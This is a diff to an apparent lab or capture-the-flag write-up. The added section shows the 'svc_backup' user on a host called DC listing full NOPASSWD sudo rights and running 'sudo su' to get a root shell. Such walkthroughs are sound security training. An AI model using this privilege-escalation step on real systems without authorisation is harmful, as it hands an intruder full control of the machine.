@@ -556,5 +556,18 @@ svc_backup@DC:~$
 ```
 I now have access to WSL as the backup user
 
+```python
+svc_backup@DC:~$ sudo -l
+Matching Defaults entries for svc_backup on DC:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_backup may run the following commands on DC:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+svc_backup@DC:~$ sudo su 
+root@DC:/home/svc_backup#
+```
+Full sudo permissions as the backup user allows me to become root very easily
+
 
 
